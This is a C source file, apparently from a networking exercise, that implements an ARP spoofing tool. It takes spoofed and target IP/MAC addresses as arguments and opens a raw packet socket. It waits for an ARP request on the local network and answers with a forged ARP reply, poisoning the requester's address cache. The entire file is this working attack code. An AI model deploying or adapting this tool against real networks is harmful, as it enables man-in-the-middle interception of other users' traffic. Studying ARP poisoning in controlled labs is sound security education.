#include "arp.h"
#include <net/if.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>

int g_sock = -1;

static void	callback(void *ctx, void *data, char *ifname)
{
	struct sockaddr_ll addr;
	t_frame *frame = (t_frame *)ctx;
	t_frame *request = (t_frame *)data;

	printf("hook request arp\n");
	memcpy(frame->header.dst, request->pkg_arp.sha, 6);
	memcpy(frame->pkg_arp.tha, request->pkg_arp.sha, 6);

	memset(&addr, 0, sizeof(addr));
	addr.sll_family = AF_PACKET;
	addr.sll_protocol = frame->header.proto;
	addr.sll_ifindex = if_nametoindex(ifname);
	printf("envoi reply\n");
	int res = sendto(g_sock, frame, sizeof(t_frame), 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_ll));
	if (res < 0)
	{
		perror("socket");
		helper();
	}
}

void	sigint_handler(int sig)
{
	(void)sig;
	if (g_sock != -1)
		close(g_sock);
	exit(0);
}

int main(int argc, char **argv)
{
	t_frame	input_arp;
	t_frame	frame;
	struct	sigaction sa;
	char	ifname[IF_NAMESIZE];

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = sigint_handler;
	sigaction(SIGINT, &sa, NULL);
	check_root();
	if (argc != 5)
		helper();
	memset(&frame, 0, sizeof(frame));
	memset(&input_arp, 0, sizeof(frame));
	get_ifname(ifname);
	get_ipv4(argv[1], &frame, true);
	get_ipv4(argv[3], &frame, false);
	get_mac(argv[2], &frame, true);
	get_mac(argv[4], &frame, false);
	frame.header.proto = htons(0x0806);
	frame.pkg_arp.hlen = 6;
	frame.pkg_arp.htype = htons(1);
	frame.pkg_arp.oper = htons(2);
	frame.pkg_arp.plen = 4;
	frame.pkg_arp.ptype = htons(0x0800);
	g_sock = socket(AF_PACKET, SOCK_RAW, frame.header.proto);
	if (g_sock < 0)
		helper();
	while (1)
	{
		int ret = recvfrom(g_sock, &input_arp, sizeof(frame), 0, NULL, NULL);
		if (ret == -1)
		{
			close(g_sock);
			helper();
		}
		if (input_arp.header.proto == htons(0x0806) && input_arp.pkg_arp.oper == htons(1))
		{
			callback(&frame, &input_arp, ifname);
			break;
		}
	}
	close(g_sock);
	return (0);
}
